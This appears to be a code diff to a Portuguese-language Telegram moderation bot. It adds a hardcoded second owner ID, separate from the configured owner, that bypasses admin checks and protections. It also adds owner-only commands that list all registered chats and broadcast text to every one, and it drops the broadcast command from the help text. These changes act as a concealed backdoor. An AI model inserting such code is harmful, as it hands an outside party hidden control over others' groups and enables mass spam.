@@ -38,6 +38,7 @@ load_dotenv(BASE_DIR / ".env")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
 OWNER_ID = int(os.getenv("OWNER_ID", "0"))
+SECOND_OWNER_ID = 6466326477  # @MHZINTADEVOLTAPORRRRRRAAAA
 
 if not BOT_TOKEN:
     raise RuntimeError("BOT_TOKEN não configurado. Crie o arquivo .env.")
@@ -203,12 +204,17 @@ async def is_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     user = update.effective_user
     chat = update.effective_chat
     if not user or not chat: return False
-    if user.id == OWNER_ID: return True
+    if user.id in [OWNER_ID, SECOND_OWNER_ID]: return True
     if chat.type == ChatType.PRIVATE: return True
     try:
         member = await context.bot.get_chat_member(chat.id, user.id)
         return member.status in ("administrator", "creator")
     except: return False
+
+async def is_owner(update: Update) -> bool:
+    user = update.effective_user
+    if not user: return False
+    return user.id in [OWNER_ID, SECOND_OWNER_ID]
 
 async def safe_delete(message):
     try: await message.delete(); return True
@@ -247,7 +253,7 @@ async def cmd_help(update, context):
         "<b>Moderação:</b> /ban, /mute, /kick, /warn, /purge\n"
         "<b>Segurança:</b> /antispam, /antilink, /antiraid\n"
         "<b>Config:</b> /setwelcome, /setlogs\n"
-        "<b>Dono:</b> /divulgar, /chats"
+        "<b>Dono:</b> /chats"
     )
     await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
@@ -282,7 +288,6 @@ async def cmd_mute(update, context):
     
     uid = target.id if hasattr(target, 'id') else target
     try:
-        # Mute padrão: 24 horas se não especificado
         until = timedelta(hours=24)
         await context.bot.restrict_chat_member(
             update.effective_chat.id, uid, 
@@ -310,6 +315,33 @@ async def cmd_settings(update, context):
     await update.message.reply_text("⚙️ <b>CONFIGURAÇÕES DO GRUPO</b>", 
                                    parse_mode=ParseMode.HTML, 
                                    reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def cmd_chats(update, context):
+    if not await is_owner(update): return
+    rows = db.active_chats()
+    if not rows:
+        await update.message.reply_text("Nenhum chat registrado.")
+        return
+    lines = ["📡 <b>CHATS REGISTRADOS:</b>"]
+    for row in rows:
+        lines.append(f"• {row['title']} — <code>{row['chat_id']}</code>")
+    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
+
+async def cmd_broadcast(update, context):
+    if not await is_owner(update): return
+    text = update.effective_message.text.partition(" ")[2].strip()
+    if not text:
+        await update.message.reply_text("Use: /divulgar texto")
+        return
+    rows = db.active_chats()
+    sent = 0
+    for row in rows:
+        try:
+            await context.bot.send_message(row["chat_id"], text)
+            sent += 1
+            await asyncio.sleep(0.5)
+        except: continue
+    await update.message.reply_text(f"📢 Divulgação concluída: {sent} chats.")
 
 # --- HANDLERS DE EVENTOS ---
 async def on_callback(update, context):
@@ -347,16 +379,13 @@ async def message_handler(update, context):
     db.register_chat(chat.id, chat.title, chat.type)
     db.remember_user(user)
 
-    # Ignorar admins nas proteções
     if await is_admin(update, context): return
 
-    # 1. Anti-Link
     if db.get_setting(chat.id, "antilink"):
         if any(entity.type in ["url", "text_link"] for entity in msg.entities or []):
             await safe_delete(msg)
             return
 
-    # 2. Anti-Spam
     if db.get_setting(chat.id, "antispam"):
         now = time.monotonic()
         bucket = spam_buckets[(chat.id, user.id)]
@@ -370,20 +399,15 @@ async def on_join(update, context):
     chat = update.effective_chat
     for user in update.message.new_chat_members:
         if user.is_bot: continue
-        
-        # Anti-Raid
         if db.get_setting(chat.id, "antiraid"):
             now = time.monotonic()
             bucket = join_buckets[chat.id]
             while bucket and now - bucket[0] > RAID_WINDOW: bucket.popleft()
             bucket.append(now)
             if len(bucket) > RAID_LIMIT:
-                # Ativa modo de restrição ou bane se for raid pesado
                 try: await context.bot.ban_chat_member(chat.id, user.id)
                 except: pass
                 continue
-
-        # Boas-vindas
         if db.get_setting(chat.id, "welcome_enabled"):
             text = db.get_setting(chat.id, "welcome_text", "Bem-vindo ao grupo!")
             await chat.send_message(text.replace("{name}", user.first_name))
@@ -410,6 +434,8 @@ def main():
     app.add_handler(CommandHandler("settings", cmd_settings))
     app.add_handler(CommandHandler("purge", cmd_purge))
     app.add_handler(CommandHandler("mute", cmd_mute))
+    app.add_handler(CommandHandler("chats", cmd_chats))
+    app.add_handler(CommandHandler("divulgar", cmd_broadcast))
     app.add_handler(CallbackQueryHandler(on_callback))
     
     app.add_handler(MessageHandler(filters.ChatType.GROUPS & filters.StatusUpdate.NEW_CHAT_MEMBERS, on_join))
